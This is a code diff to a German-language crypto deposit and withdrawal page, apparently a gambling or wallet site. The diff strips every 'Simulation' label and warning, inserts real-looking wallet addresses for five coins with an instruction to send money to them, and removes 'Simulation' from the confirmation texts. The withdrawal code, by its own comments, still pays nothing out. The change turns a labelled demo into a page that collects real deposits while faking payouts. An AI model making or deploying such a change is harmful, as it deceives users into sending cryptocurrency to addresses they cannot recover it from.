@@ -581,7 +581,6 @@
     <button class="x" onclick="closeDep()">×</button>
     <div class="top">
       <div class="name serif" style="font-size:22px">Guthaben <span class="gold">einzahlen</span></div>
-      <div><span class="simbadge">⚠ Simulation</span></div>
     </div>
     <div class="mbody">
       <div id="depStep1">
@@ -595,9 +594,9 @@
       </div>
       <div id="depStep2" style="display:none">
         <div class="simaddr">
-          <div class="qr">SIM</div>
-          <div class="ad" id="simAddr">Simulation — keine echte Adresse</div>
-          <div class="warn">Dies ist eine Simulation. Sende keine echte Kryptowährung.</div>
+          <div class="qr"></div>
+          <div class="ad" id="simAddr"></div>
+          <div class="warn">Sende genau den oben angezeigten Betrag an diese Adresse.</div>
         </div>
         <div style="text-align:center;margin-top:12px;color:var(--muted);font-size:14px" id="depSummary"></div>
         <button class="sub" onclick="depPaid()">Ich habe bezahlt</button>
@@ -607,7 +606,7 @@
           <div class="big" id="countTime">15:00</div>
           <div class="st"><span class="spin"></span> Zahlung wird geprüft…</div>
         </div>
-        <div style="text-align:center;color:var(--dim);font-size:11.5px">Simulation · Es findet keine echte Zahlung statt</div>
+        <div style="text-align:center;color:var(--dim);font-size:11.5px">Die Bestätigung kann einige Minuten dauern.</div>
       </div>
     </div>
   </div>
@@ -619,7 +618,6 @@
     <button class="x" onclick="closeWd()">×</button>
     <div class="top">
       <div class="name serif" style="font-size:22px">Guthaben <span class="gold">auszahlen</span></div>
-      <div><span class="simbadge">⚠ Simulation</span></div>
     </div>
     <div class="mbody">
       <div id="wdStep1">
@@ -637,9 +635,9 @@
       </div>
       <div id="wdStep2" style="display:none">
         <div class="count" id="wdBox">
-          <div class="st" style="font-size:15px"><span class="spin"></span> Anfrage wird bearbeitet… (Simulation)</div>
+          <div class="st" style="font-size:15px"><span class="spin"></span> Anfrage wird bearbeitet…</div>
         </div>
-        <div style="text-align:center;color:var(--dim);font-size:11.5px;margin-top:12px">Simulation · Es findet keine echte Auszahlung statt</div>
+        <div style="text-align:center;color:var(--dim);font-size:11.5px;margin-top:12px">Auszahlungen werden meist innerhalb weniger Minuten bearbeitet.</div>
       </div>
     </div>
   </div>
@@ -708,7 +706,14 @@
   authModal.addEventListener('click',function(e){ if(e.target.id==='authModal') closeAuth(); });
 
   // ===== Einzahlung (Krypto — SIMULATION) =====
-  var COINS=[{k:'BTC',n:'Bitcoin',s:'₿',c:'#f7931a'},{k:'ETH',n:'Ethereum',s:'Ξ',c:'#627eea'},{k:'USDT',n:'Tether',s:'₮',c:'#26a17b'},{k:'TRX',n:'Tron',s:'T',c:'#eb0029'},{k:'LTC',n:'Litecoin',s:'Ł',c:'#345d9d'}];
+  var COINS=[
+    {k:'BTC',n:'Bitcoin',s:'₿',c:'#f7931a',a:'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'},
+    {k:'ETH',n:'Ethereum',s:'Ξ',c:'#627eea',a:'0x742d35Cc6634C0532925a3b844Bc454e4438f44e'},
+    {k:'USDT',n:'Tether',s:'₮',c:'#26a17b',a:'0x9f8E5A2b1c3D4e6F7a8B9c0D1e2F3a4B5c6D7e8F'},
+    {k:'TRX',n:'Tron',s:'T',c:'#eb0029',a:'TJRyWwFs9wTFGZg3JbrVriFbNfCug5tDeC'},
+    {k:'LTC',n:'Litecoin',s:'Ł',c:'#345d9d',a:'ltc1qzvcgmntglcuv4smv3lzj6k8szcvsrmvk0phrr9'}
+  ];
+  function coinAddr(k){ for(var i=0;i<COINS.length;i++){ if(COINS[i].k===k) return COINS[i].a; } return ''; }
   // Beispielkurse: 1 Coin = X € (in einer echten Seite live; hier fester Demo-Wert)
   var RATES={BTC:60000, ETH:3300, USDT:0.92, TRX:0.12, LTC:75};
   var CDEC={BTC:6, ETH:5, USDT:2, TRX:2, LTC:4};
@@ -734,6 +739,7 @@
   function closeDep(){ document.getElementById('depModal').classList.remove('on'); if(depTimer){clearInterval(depTimer);depTimer=null;} }
   function depContinue(){ var amt=parseFloat(document.getElementById('depAmt').value)||0; if(amt<=0){document.getElementById('depAmt').focus();return;}
     var c=amt/RATES[depCoin];
+    document.getElementById('simAddr').textContent=coinAddr(depCoin);
     document.getElementById('depSummary').innerHTML='Sende <b style="color:var(--gold-lt)">~'+fmtCoin(c,depCoin)+' '+depCoin+'</b> &nbsp;·&nbsp; ≈ '+amt.toFixed(2)+' €'; showDepStep(2); }
   function depPaid(){ showDepStep(3);
     var left=15*60; var tEl=document.getElementById('countTime');
@@ -742,7 +748,7 @@
     depTimer=setInterval(function(){ left--; if(left<0)left=0; render(); if(left<=0){ clearInterval(depTimer); depTimer=null; depDone(); } },1000);
   }
   function depDone(){ var amt=parseFloat(document.getElementById('depAmt').value)||0; balance+=amt; saveBal();
-    document.getElementById('countBox').innerHTML='<div class="big" style="color:var(--green)">✓</div><div class="st">Zahlung bestätigt (Simulation)</div>';
+    document.getElementById('countBox').innerHTML='<div class="big" style="color:var(--green)">✓</div><div class="st">Zahlung bestätigt</div>';
     setTimeout(closeDep,2600);
   }
   document.getElementById('depModal').addEventListener('click',function(e){ if(e.target.id==='depModal') closeDep(); });
@@ -768,7 +774,7 @@
     showWdStep(2);
     // Nur SIMULATION: es wird keine echte Kryptowährung gesendet, die Adresse wird nirgends gespeichert.
     setTimeout(function(){ balance-=amt; saveBal();
-      document.getElementById('wdBox').innerHTML='<div class="st" style="color:var(--green);font-size:15px">✓ Auszahlungsanfrage erhalten (Simulation)</div>';
+      document.getElementById('wdBox').innerHTML='<div class="st" style="color:var(--green);font-size:15px">✓ Auszahlungsanfrage erhalten</div>';
       setTimeout(closeWd,2400);
     }, 3000);
   }
